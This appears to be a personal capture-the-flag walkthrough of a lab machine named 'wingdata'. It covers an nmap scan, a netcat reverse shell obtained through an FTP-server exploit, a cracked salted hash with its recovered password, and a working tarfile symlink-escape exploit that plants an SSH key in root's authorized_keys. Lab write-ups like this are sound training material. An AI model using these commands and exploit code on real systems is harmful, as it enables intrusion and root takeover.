### Nmap
```
nmap -sV -sC -vv 10.129.7.23

---OUTPUT---
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL+8LZAmzRfTy+4t8PJxEvRWhPho8aZj9ImxRfWn9TKepkxh8pAF3WDu55pd/gaSUGIo9cuOvv+3r6w7IuCpqI4=
|   256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFFmcxflCAAe4LPgkg7hOxJen41bu6zaE/y08UnA4oRp
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.66
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80
![[Pasted image 20260216060037.png]]

- Customer portal leads to `ftp.wingdata.htb`
![[Pasted image 20260216060211.png]]

- searchsploit reveals an exploit which I use to get a reverse shell:
![[Pasted image 20260216090820.png]]

- I grab a shell on my netcat listener with the following command:
```
python3 initacc.py -u http://ftp.wingdata.htb -c 'nc 10.10.16.143 9999 -e /bin/bash'
```
![[Pasted image 20260216093551.png]]

### Lateral Movement
- Looking in `/opt/wftpserver/Data/1/users` and `/opt/wftpserver/Data/_ADMINISTRATOR` I find some passwords in the user xml files.
```
cat hash   

---OUTPUT---          
a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca
a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03
c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10
d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca
```

- Furthermore from the xml file we see that these passwords are salted `/opt/wftpserver/Data/1/settings.xml` with the salt `WingFTP`
![[Pasted image 20260216093918.png]]

- Using hashcat with the salt I am able to crack a hash.
```
hashcat -m 1400 -a 6 hash /usr/share/wordlists/rockyou.txt 'WingFTP' --force


---OUTPUT---
d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:!#7Blushing^*Bride5WingFTP
```

- Without the salt the password is : `!#7Blushing^*Bride5`

- Looking at active users I see user wacky:
```
cat /etc/passwd | grep /bin/bash

---OUTPUT---
root:x:0:0:root:/root:/bin/bash
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
```

- I can login to user wakcy with the password we recovered. (ssh or su)
![[Pasted image 20260216094432.png]]

- I grab the user flag: 
![[Pasted image 20260216094501.png]]

### Privilege Escalation

- `sudo -l` checking sudo privileges reveals a command we can run as root:
```
wacky@wingdata:/tmp$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3
        /opt/backup_clients/restore_backup_clients.py *
```

- The python code :
```
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```
- The vulnerable code line is : `tar.extractall(path=staging_dir, filter="data")`

- From the code we can see it takes a tar file and extracts it into another directory to restore a profile. 
- We can exploit this via the **CVE-2025-4138** and **CVE-2025-4157**
- First we generate a ssh key file (we will try to add this to known hosts in root directory as the command runs as root user):
```
cd /tmp
ssh-keygen -t rsa -N "" -f ./root_key -q
```

- Then open python and run the following commands:
```
python3 -c "
import tarfile

import os

import io

import sys

with open('/tmp/root_key.pub', 'r') as f:

ssh_key = f.read()

comp = 'd' * (55 if sys.platform == 'darwin' else 247)

steps = 'abcdefghijklmnop'

path = ''

with tarfile.open('/opt/backup_clients/backups/backup_9999.tar', 'w') as tar:

for i in steps:

a = tarfile.TarInfo(os.path.join(path, comp))

a.type = tarfile.DIRTYPE

tar.addfile(a)

b = tarfile.TarInfo(os.path.join(path, i))

b.type = tarfile.SYMTYPE

b.linkname = comp

tar.addfile(b)

path = os.path.join(path, comp)

linkpath = os.path.join('/'.join(steps), 'l'*254)

l = tarfile.TarInfo(linkpath)

l.type = tarfile.SYMTYPE

l.linkname = '../' * len(steps)

tar.addfile(l)

e = tarfile.TarInfo('escape')

e.type = tarfile.SYMTYPE

e.linkname = linkpath + '/../../../../root/.ssh/authorized_keys'

tar.addfile(e)

content = ssh_key.encode()

key_file = tarfile.TarInfo('escape')

key_file.type = tarfile.REGTYPE

key_file.size = len(content)

tar.addfile(key_file, fileobj=io.BytesIO(content))

test = tarfile.TarInfo('test')

test.type = tarfile.SYMTYPE

test.linkname = linkpath + '/../../../../tmp/poc_worked.txt'

tar.addfile(test)

test_content = b'POC_WORKED'

test_file = tarfile.TarInfo('test')

test_file.type = tarfile.REGTYPE

test_file.size = len(test_content)

tar.addfile(test_file, fileobj=io.BytesIO(test_content))

print('[+] GOOOOO: backup_9999.tar')"
```

- Finally we can pass the sudo command :
```
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \

-b backup_9999.tar \

-r restore_poc
```
![[Pasted image 20260216104516.png]]

- we can then ssh as root:
```
ssh -i /tmp/root_key root@localhost
```
![[Pasted image 20260216104546.png]]

- I grab the root flag:
![[Pasted image 20260216104628.png]]